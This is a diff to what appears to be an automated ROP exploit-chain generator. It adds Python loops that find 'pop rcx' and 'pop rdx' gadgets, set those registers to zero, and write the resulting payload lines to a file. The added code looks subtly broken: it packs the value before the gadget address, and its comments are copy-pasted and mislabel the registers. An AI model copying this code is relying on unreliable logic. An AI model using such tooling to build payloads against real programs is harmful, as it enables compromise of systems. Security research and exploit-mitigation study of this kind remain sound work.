@@ -105,6 +105,7 @@ def case1(GadgetList) :
             fd.write(hex(int(inst.address)))
             fd.write(")")
             fd.write("\n\t")
+            break
   
         if inst.mnemonic == "xor" : 
 
@@ -130,6 +131,64 @@ def case1(GadgetList) :
 
         # Keep the loop going!
         x = x + 1
+
+    # rcx <- 0
+    rcxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rcx")
+    x = 0
+    while(x < len(rcxList)):
+        gadget = rcxList[x]
+        inst = gadget[0]
+        if inst.mnemonic == "pop" :
+            # "pop rcx; ret" found. 
+            # Steps to be taken: 
+                # Put 0 in the payload
+                # Execute "pop rax; ret"
+               
+            # Update payload
+            payload += struct.pack("<Q", 0)
+            payload += struct.pack("<Q", int(inst.address))
+                
+
+            # Write it into the file
+            fd.write("payload += struct.pack('<Q', 0)")
+            fd.write("\n\t")
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst.address)))
+            fd.write(")")
+            fd.write("\n\t")
+            break
+        x = x + 1
+
+    # rdx <- 0
+    rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
+    x = 0
+
+    while(x < len(rdxList)):
+        gadget = rdxList[x]
+        inst = gadget[0]
+        if inst.mnemonic == "pop" :
+            # "pop rcx; ret" found. 
+            # Steps to be taken: 
+                # Put 0 in the payload
+                # Execute "pop rax; ret"
+               
+            # Update payload
+            payload += struct.pack("<Q", 0)
+            payload += struct.pack("<Q", int(inst.address))
+                
+
+            # Write it into the file
+            fd.write("payload += struct.pack('<Q', 0)")
+            fd.write("\n\t")
+            fd.write("payload += struct.pack('<Q', ")
+            fd.write(hex(int(inst.address)))
+            fd.write(")")
+            fd.write("\n\t")
+            break
+        x = x + 1
+
+
+
 
 
 def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) : 
